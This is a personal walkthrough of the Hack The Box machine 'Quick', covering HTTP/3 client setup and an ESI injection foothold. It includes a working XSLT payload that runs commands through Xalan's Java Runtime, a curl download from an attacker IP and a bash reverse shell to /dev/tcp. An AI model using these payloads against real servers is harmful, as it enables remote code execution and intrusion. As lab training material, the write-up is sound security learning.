# Quick (HTTP/3, Symlinks, ESI Injection)

Quick is a hard difficulty Linux machine that features a website running on the  HTTP/3 protocol. Enumeration of the website reveals default credentials. The client portal is found to be vulnerable to ESI (Edge Side Includes) injection. This is used to obtain code execution and gain a foothold. A weak password gives access to a printer console, which permits the addition of new printers. Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a configuration are reused to escalate to root. The official HTB writeup is below:

[Quick walkthrough](https://app.hackthebox.eu/machines/Quick/walkthroughs)

## Skills Learned:

- HTTP/3 Protocol
- Using Symlinks
- ESI Injection
- Since the http server is running on a weird port, you should do a full port scan as well as a UDP scan
- Keep in mind that UDP is connectionless so the results aren't always what they seem to be

### Problems I Ran Into

1. **Installing Quiche**
- Since you cannot connect to HTTP/3 via normal browsers like firefox or chrome, you have to use the QUIC protocol
- You can use a client called quiche which can be found [here](https://github.com/cloudflare/quiche)
- To install this client properly you need the correct version of rust and cargo and these can be installed using rustup

```
sudo apt autoremove rustc
sudo apt autoremove cargo
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
// Rustup installs the latest versions of rustc and cargo
// Never run cargo as sudo, it won't allow you anyway 
// You might also want to install cmake if it is not installed already
// Don't clone the quiche repository in a directory owned by root
git clone --recursive https://github.com/cloudflare/quiche.git
cd quiche
cargo build --examples
// you will find the HTTP/3 client in:
cd target/debug/examples 
```

1. **Foothold**
- problem I ran into was getting the shell. the server from the attacker machine is supposed to be a PHP server because that one executes when it is connected to. run this with `sudo php -S 0.0.0.0:80`
- make an empty `xml` file on your attacker machine eg `pwn.xml`
- make the `esi.xsl` on your machine as well (same folder)

```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[curl http://10.10.14.4/shell -o /tmp/shell]]>
</xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

- make a bash file called `shell` on your machine (same folder as other two) and put the bash reverse shell one liner:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.6/9001 0>&1
```

- when making the ticket use this code snippet as the message:

```xml
<esi:include src="http://10.10.16.6/pwn.xml" stylesheet="http://10.10.14.4/esi.xsl">
</esi:include>
```

- now run the search ticket query and the bash script will be made on the remote server
- edit the `esi.xsl` script on you machine to run the command that'll run the bash script and spawn a reverse shell.
